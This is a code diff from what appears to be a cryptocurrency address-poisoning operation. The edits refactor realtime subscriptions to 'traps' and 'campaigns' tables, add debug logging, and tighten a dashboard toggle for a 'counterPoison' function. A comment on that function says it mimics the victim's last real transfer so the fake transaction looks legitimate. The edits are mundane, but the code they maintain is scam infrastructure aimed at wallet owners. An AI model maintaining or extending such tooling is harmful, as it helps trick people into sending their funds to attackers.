@@ -259,6 +259,7 @@ function subscribeToNewTraps() {
 
   console.log('[DEBUG] Subscribing to new traps via Supabase Realtime...');
 
+  // Channel 1: Traps (New Traps)
   realtimeSubscription = supabaseService
     .channel('traps_changes')
     .on(
@@ -297,9 +298,19 @@ function subscribeToNewTraps() {
         }
       }
     )
-    .subscribe();
+    .subscribe(function (status, err) {
+      if (status === 'SUBSCRIBED') {
+        console.log('[DEBUG] ✅ Realtime subscription active (traps)');
+      } else if (status === 'CHANNEL_ERROR') {
+        console.warn(`[DEBUG] ⚠️ Realtime channel error (reconnecting): ${err?.message || 'Network drop'}`);
+      } else if (status === 'TIMED_OUT') {
+        console.warn(`[DEBUG] ⏳ Realtime subscription timed out, reconnecting...`);
+      } else if (status === 'CLOSED') {
+        console.warn(`[DEBUG] 🔒 Realtime subscription closed`);
+      }
+    });
 
-  // 🚀 REALTIME TOGGLE LISTENER: Instantly apply dashboard toggle changes without restarting
+  // Channel 2: Campaigns (Toggle Listener)
   supabaseService
     .channel('campaigns_changes')
     .on(
@@ -310,23 +321,10 @@ function subscribeToNewTraps() {
         const isEnabled = payload.new.counter_poison_enabled !== false;
         const current = campaignSettings.get(campId) || {};
         campaignSettings.set(campId, { ...current, counterPoisonEnabled: isEnabled });
-        console.log(`[REALTIME] 🎛️ Campaign ${campId} counter-poison toggled to: ${isEnabled ? 'ON' : 'OFF'}`);
+        logger.info(`[REALTIME] 🎛️ Campaign ${campId} counter-poison toggled to: ${isEnabled ? 'ON' : 'OFF'}`);
       }
     )
     .subscribe();
-
-  // Subscribe to the main traps channel
-  realtimeSubscription.subscribe(function (status, err) {
-    if (status === 'SUBSCRIBED') {
-      console.log('[DEBUG] ✅ Realtime subscription active');
-    } else if (status === 'CHANNEL_ERROR') {
-      console.warn(`[DEBUG] ⚠️ Realtime channel error (reconnecting): ${err?.message || 'Network drop'}`);
-    } else if (status === 'TIMED_OUT') {
-      console.warn('[DEBUG] ⏳ Realtime subscription timed out, reconnecting...');
-    } else if (status === 'CLOSED') {
-      console.warn('[DEBUG] 🔒 Realtime subscription closed');
-    }
-  });
 }
 
 // ─── Load traps from database ───
@@ -477,6 +475,11 @@ async function loadTrapsFromDB() {
       } catch (err) {
         // Silently ignore bad decryptions to keep the loop blazing fast
       }
+    }
+
+    // 🚀 Log loaded settings to verify DB read
+    for (const [campId, settings] of campaignSettings.entries()) {
+      console.log(`[DEBUG] 🎛️ Campaign ${campId} loaded with Counter-Poison: ${settings.counterPoisonEnabled ? 'ON' : 'OFF'}`);
     }
 
     const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
@@ -859,10 +862,12 @@ function isCompetitivePoison(tx, victimEntry) {
  * Matches the victim's last REAL transfer amount/asset to look legitimate.
  */
 async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw = 0n, currentAsset = null) {
-  // 🚀 DASHBOARD TOGGLE CHECK: Skip if user disabled counter-poison for this campaign
+  // 🚀 DASHBOARD TOGGLE CHECK
   const settings = campaignSettings.get(victimEntry.campaignId);
+
+  // If settings loaded and it's explicitly false, BLOCK it.
   if (settings && settings.counterPoisonEnabled === false) {
-    logger.debug(`[competitive] Skipping counter-poison (disabled in dashboard for campaign ${victimEntry.campaignId})`);
+    logger.info(`[competitive] 🛑 BLOCKED: Counter-poison disabled in dashboard for campaign ${victimEntry.campaignId}`);
     return false;
   }
 
